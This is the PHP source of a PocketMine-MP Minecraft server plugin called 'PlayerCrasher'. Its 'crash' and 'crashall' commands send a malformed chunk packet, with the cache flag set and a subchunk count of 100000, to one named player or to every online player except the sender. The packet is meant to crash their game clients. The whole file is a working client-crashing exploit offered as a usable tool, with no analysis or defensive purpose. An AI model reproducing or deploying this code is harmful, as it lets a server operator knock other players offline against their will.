<?php

namespace PlayerCrasher;

use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\network\mcpe\protocol\LevelChunkPacket;
use pocketmine\Player;
use pocketmine\plugin\PluginBase;

class Main extends PluginBase {
    public function onEnable() {
        $this->getLogger()->info("enabled!");
    }

    public function onCommand(CommandSender $sender, Command $command, string $label, array $args): bool {
        if($command->getName() == "crash"){
            if(isset($args[0])){
                $player = $this->getServer()->getPlayer($args[0]);
                if($player){
                    $this->crash($player);
                    $sender->sendMessage("Player should be crashed!");
                }else{
                    $sender->sendMessage("Player not found");
                }
            }else{
                $sender->sendMessage($command->getUsage());
            }
            return true;
        }elseif($command->getName() == "crashall"){
            $players = $this->getServer()->getOnlinePlayers();
            foreach ($players as $p){
                if ($p !== $sender){
                    $this->crash($p);
                }
            }
            return true;
        }
        return false;
    }

    public function crash(Player $player):void{
        $chunk = $player->getLevel()->getChunkAtPosition($player);
        $pk = LevelChunkPacket::withCache($chunk->getX(), $chunk->getZ(), 100000, [], "");
        $player->sendDataPacket($pk);
    }
}